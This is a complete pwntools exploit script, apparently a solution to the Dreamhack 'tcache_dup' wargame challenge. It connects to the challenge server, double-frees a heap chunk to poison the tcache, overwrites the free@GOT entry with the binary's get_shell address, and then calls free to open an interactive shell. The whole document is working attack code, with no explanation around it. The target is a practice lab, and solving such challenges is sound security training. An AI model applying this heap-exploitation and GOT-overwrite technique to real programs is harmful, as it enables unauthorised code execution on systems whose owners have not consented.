from pwn import *
p = remote('host3.dreamhack.games', 13375)
e = ELF('./tcache_dup')
libc = ELF('./libc-2.27.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')      
    p.sendlineafter(b'Size: ', str(size).encode())  
    p.sendafter(b'Data: ', data)      

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

get_shell = e.symbols['get_shell']
free = e.got['free']

create(0x80, b'A'*8)
delete(0)
delete(0)  # double free

create(0x80, p64(free))  # overwrite free@got with get_shell
create(0x80, b'B'*8)  # allocate chunk to get free
create(0x80, p64(get_shell))  # overwrite free@got with get
delete(0)  # call get_shell

p.interactive()